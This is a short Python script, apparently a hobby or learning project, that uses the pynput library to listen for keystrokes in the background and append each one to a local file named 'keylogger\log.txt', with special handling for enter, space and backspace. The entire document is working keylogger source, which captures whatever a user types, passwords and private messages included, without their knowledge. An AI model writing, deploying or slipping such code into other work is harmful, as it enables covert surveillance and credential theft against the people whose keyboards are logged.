from pynput import keyboard 

file_name = "keylogger\log.txt"

def keyPressed(key):
  clean_string = str(key).replace("'", "")
  with open(file_name, "a") as file:
    if clean_string == "Key.enter":
      file.write("\n")
    elif clean_string == "Key.space":
      file.write(" ")
    elif clean_string == "Key.backspace":
      file.seek(0, 2)
      file.seek(file.tell() - 1, 0)
      file.truncate()
    else:
     file.write(clean_string)

if __name__ == "__main__":
  listener = keyboard.Listener(on_press=keyPressed)
  listener.start()
  input()